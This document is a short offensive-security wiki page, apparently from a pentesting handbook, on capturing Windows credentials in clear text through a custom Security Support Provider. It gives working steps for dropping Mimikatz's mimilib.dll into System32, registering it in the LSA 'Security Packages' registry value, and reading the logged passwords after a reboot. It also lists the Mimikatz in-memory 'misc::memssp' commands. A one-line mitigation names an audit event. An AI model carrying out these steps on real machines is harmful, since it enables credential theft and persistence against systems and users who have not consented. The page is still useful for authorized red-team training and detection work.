# Custom SSP

## Custom SSP

[Learn what is a SSP \(Security Support Provider\) here.](../authentication-credentials-uac-and-efs.md#security-support-provider-interface-sspi)  
You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.

#### Mimilib

You can use the `mimilib.dll` binary provided by Mimikatz. **This will log inside a file all the credentials in clear text.**  
Drop the dll in ****`C:\Windows\System32\`  
Get a list existing LSA Security Packages:

{% code title="attacker@target" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
    Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

Add `mimilib.dll` to the Security Support Provider list \(Security Packages\):

```csharp
PS C:\> reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```

And after a reboot all credentials can be found in clear text in `C:\Windows\System32\kiwissp.log`

#### In memory

You can also inject this in memory directly using Mimikatz \(notice that it could be a little bit unstable/not working\):

```csharp
privilege::debug
misc::memssp
```

This won't survive reboots.

### Mitigation

Event ID 4657 - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

